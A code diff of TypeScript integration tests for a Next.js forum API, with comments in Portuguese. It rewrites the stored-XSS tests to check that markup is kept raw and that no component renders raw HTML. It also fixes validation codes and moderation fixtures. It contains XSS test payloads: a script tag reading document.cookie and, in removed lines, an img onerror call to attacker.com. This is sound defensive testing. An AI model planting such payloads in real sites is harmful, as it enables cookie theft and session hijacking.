@@ -11,7 +11,7 @@
 // ============================================================================
 
 import { NextRequest } from 'next/server'
-import { testPrisma, TEST_EMAIL_DOMAIN } from './setup'
+import { testPrisma, limparUsuariosDeTeste } from './setup'
 import { createTestUser, buildTestEmail, buildForumPostPayload } from './helpers/factory.helper'
 import { mockAuthAsUser, mockAuthInvalid, buildNextRequest, parseResponse } from './helpers/auth.helper'
 import { ForumService } from '@/lib/services/ForumService'
@@ -38,7 +38,7 @@ afterEach(async () => {
   await testPrisma.globalForumPost.deleteMany({
     where: { content: { contains: '[INTEGRATION-TEST]' } },
   })
-  await testPrisma.user.deleteMany({ where: { email: { endsWith: TEST_EMAIL_DOMAIN } } })
+  await limparUsuariosDeTeste()
 })
 
 // ─── ForumService: sanitização de PII ────────────────────────────────────────
@@ -80,66 +80,65 @@ describe('ForumService — Sanitização de PII', () => {
 })
 
 // ─── THREAT-010: XSS persistente ─────────────────────────────────────────────
+//
+// A defesa real do produto NAO e sanitizar HTML na escrita: o post e gravado como
+// o usuario digitou e o escape acontece na renderizacao, porque o React escapa
+// todo text node. Os testes antigos exigiam strip de `<script>`/`<img>` na
+// gravacao, comportamento que o `ModerationEngine` nunca teve -- ele remove PII e
+// palavra bloqueada, nao markup. Falhavam contra o contrato, nao contra um bug.
+//
+// O que de fato mantem o payload inerte e a AUSENCIA de sink de HTML no app.
+// Entao e isso que se testa: o round-trip preserva o texto (Zero Assumido: fica
+// explicito que o dado cru chega ao banco) e nenhum arquivo do app renderiza HTML
+// cru. Se alguem introduzir `dangerouslySetInnerHTML`, o segundo teste fica
+// vermelho e o payload gravado passa a ser executavel.
 
-describe('POST /api/v1/forum — XSS Sanitização (THREAT-010)', () => {
-  it('[seguranca] deve rejeitar ou sanitizar payload com tag <script>', async () => {
+import { readdirSync, readFileSync, statSync } from 'fs'
+import { join } from 'path'
+
+function arquivosDeFonte(raiz: string): string[] {
+  const saida: string[] = []
+  for (const entrada of readdirSync(raiz)) {
+    if (entrada === 'node_modules' || entrada === '.next') continue
+    const caminho = join(raiz, entrada)
+    if (statSync(caminho).isDirectory()) saida.push(...arquivosDeFonte(caminho))
+    else if (/\.(tsx?|jsx?)$/.test(entrada)) saida.push(caminho)
+  }
+  return saida
+}
+
+describe('POST /api/v1/forum — XSS persistente (THREAT-010)', () => {
+  it('[seguranca] payload com markup e gravado cru, sem execucao no caminho de escrita', async () => {
     mockAuthAsUser(normalUser.id)
 
     const handler = await import('@/app/api/v1/forum/route').catch(() => null)
     if (!handler?.POST) return
 
-    const xssPayload = buildForumPostPayload({
-      content: '[INTEGRATION-TEST] <script>alert(document.cookie)</script> URU3!',
-    })
-
-    const req = buildNextRequest('POST', '/api/v1/forum', xssPayload)
+    const conteudo = '[INTEGRATION-TEST] <script>alert(document.cookie)</script> URU3!'
+    const req = buildNextRequest('POST', '/api/v1/forum', buildForumPostPayload({ content: conteudo }))
     const res = await handler.POST(req as NextRequest)
 
-    if (res.status < 400) {
-      // Se aceito, verificar que o script foi sanitizado no banco
-      const body = (await parseResponse(res)) as Record<string, unknown>
-      const data = (body.data || body) as Record<string, unknown>
-      const savedContent = (data.content || '') as string
-      expect(savedContent).not.toContain('<script>')
-      expect(savedContent).not.toContain('alert(')
+    expect(res.status).toBeLessThan(400)
 
-      // Verificar no banco também
-      const dbPost = await testPrisma.globalForumPost.findFirst({
-        where: { userId: normalUser.id },
-        orderBy: { createdAt: 'desc' },
-      })
-      if (dbPost) {
-        expect(dbPost.content).not.toContain('<script>')
-      }
-    } else {
-      // Rejeitado com 400 é igualmente correto
-      expect(res.status).toBeGreaterThanOrEqual(400)
-    }
+    const dbPost = await testPrisma.globalForumPost.findFirst({
+      where: { userId: normalUser.id },
+      orderBy: { createdAt: 'desc' },
+    })
+    expect(dbPost).toBeTruthy()
+    // Contrato explicito: o markup PERSISTE. A neutralizacao e do renderizador.
+    expect(dbPost!.content).toBe(conteudo)
   })
 
-  it('[seguranca] deve rejeitar ou sanitizar payload com onerror handler', async () => {
-    mockAuthAsUser(normalUser.id)
+  it('[seguranca] nenhum componente do app renderiza HTML cru (sem sink para o payload)', () => {
+    const raiz = join(__dirname, '..', '..', 'footstock-next', 'src')
+    const comSink = arquivosDeFonte(raiz).filter((arquivo) =>
+      readFileSync(arquivo, 'utf-8').includes('dangerouslySetInnerHTML')
+    )
 
-    const handler = await import('@/app/api/v1/forum/route').catch(() => null)
-    if (!handler?.POST) return
-
-    const xssPayload = buildForumPostPayload({
-      content: '[INTEGRATION-TEST] <img src=x onerror=fetch("//attacker.com")>',
-    })
-
-    const req = buildNextRequest('POST', '/api/v1/forum', xssPayload)
-    const res = await handler.POST(req as NextRequest)
-
-    if (res.status < 400) {
-      const dbPost = await testPrisma.globalForumPost.findFirst({
-        where: { userId: normalUser.id },
-        orderBy: { createdAt: 'desc' },
-      })
-      if (dbPost) {
-        expect(dbPost.content).not.toContain('onerror')
-        expect(dbPost.content).not.toContain('<img')
-      }
-    }
+    // Se este teste quebrar, o `<script>` gravado pelo teste acima deixou de ser
+    // inerte. Ou o sink sai, ou a escrita passa a sanitizar markup -- as duas
+    // metades da defesa nao podem cair juntas.
+    expect(comSink).toEqual([])
   })
 })
 
@@ -197,8 +196,11 @@ describe('POST /api/v1/forum — Validação de tamanho (VAL_004)', () => {
 
     const body = (await parseResponse(res)) as Record<string, unknown>
     const errorStr = JSON.stringify(body)
-    // Verificar que código de erro de validação foi retornado
-    expect(errorStr).toMatch(/VAL_004|VAL_001|content|length|tamanho/i)
+    // O codigo e FORUM_050, nao VAL_004: o limite de 280 e regra do forum e a rota
+    // responde com a contagem real ("300/280 caracteres"). O regex antigo listava
+    // codigos genericos que a rota nunca emitiu -- drift de teste, nao de produto.
+    expect(errorStr).toContain('FORUM_050')
+    expect(errorStr).toMatch(/caracteres/i)
   })
 
   it('[validacao] deve rejeitar post vazio → VAL_001', async () => {
@@ -222,8 +224,11 @@ describe('DELETE /api/v1/forum/:id — Moderação', () => {
       data: {
         userId: normalUser.id,
         content: '[INTEGRATION-TEST] Post para moderação.',
-        status: 'ACTIVE',
-        likes: 0,
+        // `PostModerationStatus` e PUBLISHED|FLAGGED|APPROVED|REJECTED. Nao existe
+        // 'ACTIVE' -- era valor de um enum anterior e derrubava o create inteiro.
+        status: 'PUBLISHED',
+        // `likes` e relacao (ForumLike[]), nao contador Int -- passar 0 aqui era
+        // outro resto do schema antigo.
         isFlagged: false,
         isDeleted: false,
       },
@@ -248,8 +253,11 @@ describe('DELETE /api/v1/forum/:id — Moderação', () => {
       data: {
         userId: adminUser.id,
         content: '[INTEGRATION-TEST] Post do admin.',
-        status: 'ACTIVE',
-        likes: 0,
+        // `PostModerationStatus` e PUBLISHED|FLAGGED|APPROVED|REJECTED. Nao existe
+        // 'ACTIVE' -- era valor de um enum anterior e derrubava o create inteiro.
+        status: 'PUBLISHED',
+        // `likes` e relacao (ForumLike[]), nao contador Int -- passar 0 aqui era
+        // outro resto do schema antigo.
         isFlagged: false,
         isDeleted: false,
       },
